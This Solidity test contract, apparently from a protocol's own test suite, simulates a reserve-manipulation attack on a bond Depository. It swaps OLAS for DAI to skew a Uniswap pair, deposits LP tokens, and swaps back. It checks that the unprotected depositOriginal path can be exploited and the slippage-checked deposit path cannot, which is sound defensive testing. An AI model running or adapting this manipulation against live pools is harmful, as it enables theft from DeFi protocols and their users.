// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "hardhat/console.sol";

interface IDepository {
    function deposit(address token, uint256 productId, uint256 tokenAmount, address user) external
        returns (uint256 payout, uint256 expiry, uint256 numBonds);
    function depositOriginal(address token, uint256 productId, uint256 tokenAmount, address user) external
        returns (uint256 payout, uint256 expiry, uint256 numBonds);
}

interface IRouter {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

/// @title AttackDeposit - Smart contract for proof attack to Depository.deposit
contract AttackDeposit {
    uint256 public constant LARGE_APPROVAL = 1_000_000 * 1e18;
    
    constructor() {}

    // @dev emulate deposit process from EOA
    // @param depository Address of depository.
    // @param token Address of pair
    // @param olas Address of OLAS token
    // @param bid number of bid
    // @param amountTo amount LP for deposit. 
    function normalDeposit(address depository, address token, address olas, uint256 bid, uint256 amountTo) external {        
        IUniswapV2Pair pair = IUniswapV2Pair(address(token));
        address token0 = pair.token0();
        address token1 = pair.token1();
        uint256 balance0 = IERC20(token0).balanceOf(address(pair));
        uint256 balance1 = IERC20(token1).balanceOf(address(pair));
        uint256 totalSupply = pair.totalSupply();
        uint256 balanceOLA = (token0 == olas) ? balance0 : balance1;
        console.log("AttackDeposit ## OLAS reserved before deposi", balanceOLA);
        
        // Trying to deposit the amount that would result in an overflow payout for the LP supply
        // await pairODAI.connect(deployer).approve(depository.address, LARGE_APPROVAL);
        // depository.connect(deployer).deposit(pairODAI.address, bid, amountTo, deployer.address);
        IERC20(token).approve(depository, LARGE_APPROVAL);
        (uint256 payout, uint256 expiry, uint256 numBonds) = IDepository(depository).deposit(token, bid, amountTo, address(this));
        console.log("AttackDeposit ## payout", payout);
        console.log("AttackDeposit ## expiry", expiry);
        console.log("AttackDeposit ## numBonds", numBonds);
        
        balance0 = IERC20(token0).balanceOf(address(pair));
        balance1 = IERC20(token1).balanceOf(address(pair));
        totalSupply = pair.totalSupply();
        balanceOLA = (token0 == olas) ? balance0 : balance1;
        console.log("AttackDeposit ## OLAS reserved after deposit", balanceOLA);
    }

    // @dev emulate attack against deposit without slippage check
    // @param depository Address of depository.
    // @param token Address of pair
    // @param olas Address of OLAS token
    // @param bid number of bid
    // @param amountTo amount LP for deposit.
    // @param swapRouter uniswapV2 router address 
    function attackDepositMustSuccess(address depository, address token, address olas, uint256 bid, uint256 amountTo, address swapRouter) external {
        // Trying to deposit the amount that would result in an overflow payout for the LP supply
        // await pairODAI.connect(deployer).approve(depository.address, LARGE_APPROVAL);
        // depository.connect(deployer).deposit(pairODAI.address, bid, amountTo, deployer.address);
        address[] memory path = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        IERC20(token).approve(depository, LARGE_APPROVAL);
        // IUniswapV2Pair pair = IUniswapV2Pair(address(token));
        address token0 = IUniswapV2Pair(address(token)).token0();
        address token1 = IUniswapV2Pair(address(token)).token1();
        uint256 balance0 = IERC20(token0).balanceOf(token);
        uint256 balance1 = IERC20(token1).balanceOf(token);
        // uint256 totalSupply = pair.totalSupply();
        uint256 balanceOLA = (token0 == olas) ? balance0 : balance1;
        uint256 balanceDAI = (token0 == olas) ? balance1 : balance0;
        console.log("AttackDeposit ## OLAS reserved before deposi", balanceOLA);
        console.log("AttackDeposit ## DAI reserved before deposi", balanceDAI);
        // uint256 amountToSwap = IERC20(olas).balanceOf(address(this));

        path[0] = (token0 == olas) ? token0 : token1;
        path[1] = (token0 == olas) ? token1 : token0;

        console.log("balance OLAS in this contract before swap {pseudo flash loan OLAS}:",IERC20(olas).balanceOf(address(this)));
        IERC20(olas).approve(swapRouter, LARGE_APPROVAL);
        amounts = IRouter(swapRouter).swapExactTokensForTokens(IERC20(olas).balanceOf(address(this)), 0, path, address(this), block.timestamp + 3000);
        console.log("balance OLAS in this contract after swap:",IERC20(olas).balanceOf(address(this)));

        balance0 = IERC20(token0).balanceOf(token);
        balance1 = IERC20(token1).balanceOf(token);
        // totalSupply = pair.totalSupply();
        balanceOLA = (token0 == olas) ? balance0 : balance1;
        balanceDAI = (token0 == olas) ? balance1 : balance0;
        console.log("AttackDeposit ## OLAS reserved after swap", balanceOLA);
        console.log("AttackDeposit ## DAI reserved before swap", balanceDAI);

        IDepository(depository).depositOriginal(token, bid, amountTo, address(this));
        //console.log("AttackDeposit ## payout", payout);
        
        // DAI approve 
        IERC20(path[1]).approve(swapRouter, LARGE_APPROVAL);
        // swap back
        path[0] = path[1];
        path[1] = olas;
        amounts = IRouter(swapRouter).swapExactTokensForTokens(IERC20(path[0]).balanceOf(address(this)), 0, path, address(this), block.timestamp + 3000);
        console.log("balance OLAS in this contract after swap:",IERC20(olas).balanceOf(address(this)));

        balance0 = IERC20(token0).balanceOf(token);
        balance1 = IERC20(token1).balanceOf(token);
        // totalSupply = pair.totalSupply();
        balanceOLA = (token0 == olas) ? balance0 : balance1;
        balanceDAI = (token0 == olas) ? balance1 : balance0;
        console.log("AttackDeposit ## OLAS reserved after swap", balanceOLA);
        console.log("AttackDeposit ## DAI reserved before swap", balanceDAI);
    }

    // @dev emulate attack against deposit with slippage check
    // @param depository Address of depository.
    // @param token Address of pair
    // @param olas Address of OLAS token
    // @param bid number of bid
    // @param amountTo amount LP for deposit.
    // @param swapRouter uniswapV2 router address 
    function attackDepositMustFail(address depository, address token, address olas, uint256 bid, uint256 amountTo, address swapRouter) external {
        // Trying to deposit the amount that would result in an overflow payout for the LP supply
        // await pairODAI.connect(deployer).approve(depository.address, LARGE_APPROVAL);
        // depository.connect(deployer).deposit(pairODAI.address, bid, amountTo, deployer.address);
        address[] memory path = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        IERC20(token).approve(depository, LARGE_APPROVAL);
        // IUniswapV2Pair pair = IUniswapV2Pair(address(token));
        address token0 = IUniswapV2Pair(address(token)).token0();
        address token1 = IUniswapV2Pair(address(token)).token1();
        uint256 balance0 = IERC20(token0).balanceOf(token);
        uint256 balance1 = IERC20(token1).balanceOf(token);
        // uint256 totalSupply = pair.totalSupply();
        uint256 balanceOLA = (token0 == olas) ? balance0 : balance1;
        uint256 balanceDAI = (token0 == olas) ? balance1 : balance0;
        console.log("AttackDeposit ## OLAS reserved before deposi", balanceOLA);
        console.log("AttackDeposit ## DAI reserved before deposi", balanceDAI);
        // uint256 amountToSwap = IERC20(olas).balanceOf(address(this));

        path[0] = (token0 == olas) ? token0 : token1;
        path[1] = (token0 == olas) ? token1 : token0;

        console.log("balance OLAS in this contract before swap {pseudo flash loan OLAS}:",IERC20(olas).balanceOf(address(this)));
        IERC20(olas).approve(swapRouter, LARGE_APPROVAL);
        amounts = IRouter(swapRouter).swapExactTokensForTokens(IERC20(olas).balanceOf(address(this)), 0, path, address(this), block.timestamp + 3000);
        console.log("balance OLAS in this contract after swap:",IERC20(olas).balanceOf(address(this)));

        balance0 = IERC20(token0).balanceOf(token);
        balance1 = IERC20(token1).balanceOf(token);
        // totalSupply = pair.totalSupply();
        balanceOLA = (token0 == olas) ? balance0 : balance1;
        balanceDAI = (token0 == olas) ? balance1 : balance0;
        console.log("AttackDeposit ## OLAS reserved after swap", balanceOLA);
        console.log("AttackDeposit ## DAI reserved before swap", balanceDAI);

        IDepository(depository).deposit(token, bid, amountTo, address(this));
        //console.log("AttackDeposit ## payout", payout);
        
        // DAI approve 
        IERC20(path[1]).approve(swapRouter, LARGE_APPROVAL);
        // swap back
        path[0] = path[1];
        path[1] = olas;
        amounts = IRouter(swapRouter).swapExactTokensForTokens(IERC20(path[0]).balanceOf(address(this)), 0, path, address(this), block.timestamp + 3000);
        console.log("balance OLAS in this contract after swap:",IERC20(olas).balanceOf(address(this)));

        balance0 = IERC20(token0).balanceOf(token);
        balance1 = IERC20(token1).balanceOf(token);
        // totalSupply = pair.totalSupply();
        balanceOLA = (token0 == olas) ? balance0 : balance1;
        balanceDAI = (token0 == olas) ? balance1 : balance0;
        console.log("AttackDeposit ## OLAS reserved after swap", balanceOLA);
        console.log("AttackDeposit ## DAI reserved before swap", balanceDAI);
    }    

}